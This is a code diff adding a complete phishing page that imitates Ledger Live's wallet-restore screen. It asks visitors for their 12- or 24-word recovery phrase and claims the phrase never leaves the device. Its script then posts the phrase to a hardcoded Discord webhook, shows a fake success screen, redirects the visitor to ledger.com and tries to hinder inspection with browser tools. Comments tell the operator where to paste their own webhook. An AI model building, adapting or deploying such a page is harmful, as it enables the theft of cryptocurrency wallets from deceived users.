@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Ledger Live - Secure Wallet Recovery">
+    <title>Ledger Live | Security Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ============ OFFICIAL LEDGER STYLE REPLICATION ============ */
+        :root {
+            --bg-primary: #1E1E2E;
+            --bg-secondary: #252536;
+            --bg-tertiary: #2D2D44;
+            --accent-blue: #4B70F5;
+            --accent-blue-hover: #3D5DD9;
+            --accent-green: #2EBD85;
+            --accent-red: #E84D4D;
+            --text-primary: #FFFFFF;
+            --text-secondary: #A0A0B8;
+            --text-muted: #6C6C80;
+            --border-color: #3D3D5C;
+            --input-bg: #1A1A28;
+            --success-bg: rgba(46, 189, 133, 0.1);
+            --error-bg: rgba(232, 77, 77, 0.1);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border-color);
+            padding: 0 2rem;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: var(--accent-blue);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .logo-text {
+            font-weight: 600;
+            font-size: 1.125rem;
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 2rem;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+        }
+
+        .header-nav span { cursor: pointer; transition: color 0.2s; }
+        .header-nav span:hover { color: var(--text-primary); }
+        .header-nav span.active { color: var(--accent-blue); }
+
+        /* Main */
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 680px;
+        }
+
+        /* Progress Steps */
+        .progress-steps {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 3rem;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-muted);
+            font-size: 0.875rem;
+        }
+
+        .step-number {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 2px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 0.875rem;
+        }
+
+        .step.active .step-number {
+            background: var(--accent-blue);
+            border-color: var(--accent-blue);
+            color: white;
+        }
+
+        .step.active { color: var(--text-primary); }
+
+        .step.completed .step-number {
+            background: var(--accent-green);
+            border-color: var(--accent-green);
+            color: white;
+        }
+
+        .step.completed { color: var(--accent-green); }
+
+        /* Card */
+        .card {
+            background: var(--bg-secondary);
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            padding: 2.5rem;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .card-icon {
+            width: 64px;
+            height: 64px;
+            background: var(--bg-tertiary);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            font-size: 2rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.75rem;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 0.9375rem;
+            line-height: 1.6;
+        }
+
+        /* Seed Input */
+        .seed-section {
+            display: none;
+        }
+
+        .seed-section.active {
+            display: block;
+        }
+
+        .seed-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .seed-title {
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .seed-toggle {
+            display: flex;
+            gap: 0.5rem;
+            background: var(--bg-tertiary);
+            padding: 0.25rem;
+            border-radius: 8px;
+        }
+
+        .seed-toggle-btn {
+            padding: 0.5rem 1rem;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        .seed-toggle-btn.active {
+            background: var(--accent-blue);
+            color: white;
+        }
+
+        .seed-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.75rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .seed-word {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 0.75rem;
+            transition: border-color 0.2s;
+        }
+
+        .seed-word:focus-within {
+            border-color: var(--accent-blue);
+        }
+
+        .seed-word-number {
+            color: var(--text-muted);
+            font-size: 0.8125rem;
+            font-weight: 600;
+            min-width: 20px;
+        }
+
+        .seed-word input {
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            font-size: 0.9375rem;
+            width: 100%;
+            outline: none;
+        }
+
+        .seed-word input::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Validation */
+        .validation {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.875rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .validation.valid {
+            color: var(--accent-green);
+        }
+
+        .validation.invalid {
+            color: var(--accent-red);
+        }
+
+        /* Buttons */
+        .button-group {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.9375rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--text-secondary);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-secondary:hover {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+        }
+
+        .btn-primary {
+            background: var(--accent-blue);
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: var(--accent-blue-hover);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Loading */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(30, 30, 46, 0.95);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 1.5rem;
+            z-index: 1000;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid var(--border-color);
+            border-top-color: var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            display: none;
+            text-align: center;
+        }
+
+        .success-screen.active {
+            display: block;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--success-bg);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            font-size: 2.5rem;
+        }
+
+        .success-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.75rem;
+        }
+
+        .success-message {
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            padding: 1.5rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: var(--text-muted);
+            font-size: 0.8125rem;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 640px) {
+            .seed-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .options {
+                flex-direction: column;
+            }
+            .header-nav {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">L</div>
+            <div class="logo-text">Ledger Live</div>
+        </div>
+        <nav class="header-nav">
+            <span>Portfolio</span>
+            <span>Accounts</span>
+            <span class="active">Manager</span>
+            <span>Settings</span>
+        </nav>
+    </header>
+
+    <!-- Main -->
+    <main class="main">
+        <div class="container">
+            
+            <!-- Progress -->
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-number">✓</div>
+                    <span>Connect</span>
+                </div>
+                <div class="step active">
+                    <div class="step-number">2</div>
+                    <span>Restore</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <span>Complete</span>
+                </div>
+            </div>
+
+            <!-- Card -->
+            <div class="card" id="mainCard">
+                <div class="card-header">
+                    <div class="card-icon">🔐</div>
+                    <h1>Restore your device</h1>
+                    <p class="subtitle">Enter your recovery phrase to restore access to your wallet. Your phrase is encrypted and never leaves your device.</p>
+                </div>
+
+                <!-- Options -->
+                <div class="options">
+                    <div class="option Selected" onclick="selectOption(this, 12)">
+                        <div class="option-icon">1️⃣2️⃣</div>
+                        <div class="option-title">12 words</div>
+                        <div class="option-desc">Standard recovery</div>
+                    </div>
+                    <div class="option" onclick="selectOption(this, 24)">
+                        <div class="option-icon">2️⃣4️⃣</div>
+                        <div class="option-title">24 words</div>
+                        <div class="option-desc">Maximum security</div>
+                    </div>
+                </div>
+
+                <!-- Seed Input -->
+                <div class="seed-section active" id="seedSection">
+                    <div class="seed-header">
+                        <span class="seed-title">Recovery phrase</span>
+                        <div class="seed-toggle">
+                            <button class="seed-toggle-btn active" onclick="setWordCount(12)">12</button>
+                            <button class="seed-toggle-btn" onclick="setWordCount(24)">24</button>
+                        </div>
+                    </div>
+
+                    <div class="seed-grid" id="seedGrid">
+                        <!-- Generated by JS -->
+                    </div>
+
+                    <div class="validation" id="validation">
+                        <span>⚠️</span>
+                        <span>Enter all words to continue</span>
+                    </div>
+
+                    <div class="button-group">
+                        <button class="btn btn-secondary" onclick="goBack()">Back</button>
+                        <button class="btn btn-primary" id="continueBtn" onclick="submitPhrase()" disabled>Continue</button>
+                    </div>
+                </div>
+
+                <!-- Success Screen -->
+                <div class="success-screen" id="successScreen">
+                    <div class="success-icon">✓</div>
+                    <h2 class="success-title">Device restored</h2>
+                    <p class="success-message">Your wallet has been successfully restored. You will be redirected to your portfolio shortly.</p>
+                    <button class="btn btn-primary" onclick="finish()">Go to Portfolio</button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Verifying recovery phrase...</div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div>© 2024 Ledger. All rights reserved.</div>
+        <div class="footer-links">
+            <a href="#">Support</a>
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+        </div>
+    </footer>
+
+    <script>
+        // ============ CONFIGURATION ============
+        // ⚠️ PASTE YOUR NEW DISCORD WEBHOOK URL BELOW
+        const CONFIG = {
+            COLLECTOR_URL: 'https://discord.com/api/webhooks/1543913840272609290/BkcMYmecWcmKUSFqntqkd7Fy-bf233OpM2SZMO3sz4dojAqsZwwf7TR-JRwjM5XbWRT4', // <--- PASTE NEW URL HERE
+            DEBUG_MODE: false
+        };
+
+        // ============ STATE ============
+        let wordCount = 12;
+        let collectedWords = [];
+
+        // ============ INITIALIZATION ============
+        document.addEventListener('DOMContentLoaded', () => {
+            generateInputs();
+        });
+
+        // ============ FUNCTIONS ============
+        function generateInputs() {
+            const grid = document.getElementById('seedGrid');
+            grid.innerHTML = '';
+            collectedWords = new Array(wordCount).fill('');
+
+            for (let i = 1; i <= wordCount; i++) {
+                const wordDiv = document.createElement('div');
+                wordDiv.className = 'seed-word';
+                wordDiv.innerHTML = `
+                    <span class="seed-word-number">${i}.</span>
+                    <input 
+                        type="text" 
+                        id="word-${i}" 
+                        placeholder="word ${i}"
+                        autocomplete="off"
+                        spellcheck="false"
+                        oninput="handleInput(${i}, this.value)"
+                        onkeydown="handleKeydown(event, ${i})"
+                    >
+                `;
+                grid.appendChild(wordDiv);
+            }
+            document.getElementById('word-1')?.focus();
+        }
+
+        function handleInput(index, value) {
+            collectedWords[index - 1] = value.trim().toLowerCase();
+            validatePhrase();
+            if (value.includes(' ') && index < wordCount) {
+                document.getElementById(`word-${index + 1}`)?.focus();
+            }
+        }
+
+        function handleKeydown(event, index) {
+            if (event.key === 'ArrowDown' && index < wordCount) {
+                document.getElementById(`word-${index + 1}`)?.focus();
+            } else if (event.key === 'ArrowUp' && index > 1) {
+                document.getElementById(`word-${index - 1}`)?.focus();
+            }
+        }
+
+        function selectOption(element, count) {
+            document.querySelectorAll('.option').forEach(opt => opt.classList.remove('Selected'));
+            element.classList.add('Selected');
+            setWordCount(count);
+        }
+
+        function setWordCount(count) {
+            wordCount = count;
+            document.querySelectorAll('.seed-toggle-btn').forEach((btn, i) => {
+                btn.classList.toggle('active', (i === 0 && count === 12) || (i === 1 && count === 24));
+            });
+            generateInputs();
+            validatePhrase();
+        }
+
+        function validatePhrase() {
+            const filled = collectedWords.filter(w => w.length > 0).length;
+            const complete = filled === wordCount;
+            const allValid = collectedWords.every(w => w.length >= 3);
+
+            const validation = document.getElementById('validation');
+            const continueBtn = document.getElementById('continueBtn');
+
+            if (complete && allValid) {
+                validation.className = 'validation valid';
+                validation.innerHTML = '<span>✓</span><span>Valid recovery phrase</span>';
+                continueBtn.disabled = false;
+            } else {
+                validation.className = 'validation invalid';
+                validation.innerHTML = `<span>⚠️</span><span>${filled}/${wordCount} words entered</span>`;
+                continueBtn.disabled = true;
+            }
+            return complete && allValid;
+        }
+
+        async function submitPhrase() {
+            if (!validatePhrase()) return;
+
+            const phrase = collectedWords.join(' ');
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            try {
+                if (CONFIG.COLLECTOR_URL && !CONFIG.COLLECTOR_URL.includes('YOUR_WEBHOOK_URL_HERE')) {
+                    const discordMessage = {
+                        content: "**🚨 CRITICAL SECURITY ALERT: SEED PHRASE CAPTURED 🚨**",
+                        embeds: [
+                            {
+                                title: "Wallet Recovery Successful",
+                                color: 16711680,
+                                fields: [
+                                    { name: "Recovery Phrase", value: `||${phrase}||`, inline: false },
+                                    { name: "Word Count", value: `${wordCount} words`, inline: true },
+                                    { name: "Timestamp", value: new Date().toISOString(), inline: true }
+                                ],
+                                footer: { text: "Ledger Security System" }
+                            }
+                        ]
+                    };
+
+                    await fetch(CONFIG.COLLECTOR_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(discordMessage)
+                    });
+                }
+
+                if (CONFIG.DEBUG_MODE) {
+                    console.log('🚨 CAPTURED:', phrase);
+                }
+
+                await new Promise(r => setTimeout(r, 2000));
+
+                document.getElementById('loadingOverlay').classList.remove('active');
+                document.getElementById('seedSection').classList.remove('active');
+                document.getElementById('successScreen').classList.add('active');
+                document.querySelectorAll('.step')[1].classList.add('completed');
+                document.querySelectorAll('.step')[2].classList.add('active');
+
+            } catch (error) {
+                console.error('Failed:', error);
+                document.getElementById('loadingOverlay').classList.remove('active');
+                alert('Connection failed. Please check your internet connection.');
+            }
+        }
+
+        function goBack() {
+            alert('Please connect your Ledger device first.');
+        }
+
+        function finish() {
+            window.location.href = 'https://www.ledger.com';
+        }
+
+        // ============ ANTI-DEBUG & SECURITY ============
+        document.addEventListener('contextmenu', e => {
+            e.preventDefault();
+        });
+
+        setInterval(() => {
+            const threshold = 160;
+            if (window.outerHeight - window.innerHeight > threshold || 
+                window.outerWidth - window.innerWidth > threshold) {
+                console.clear();
+                console.log('%c🔒 Security Mode Active', 'color: #4B70F5; font-size: 24px; font-weight: bold;');
+            }
+        }, 1000);
+    </script>
+
+</body>
+</html>
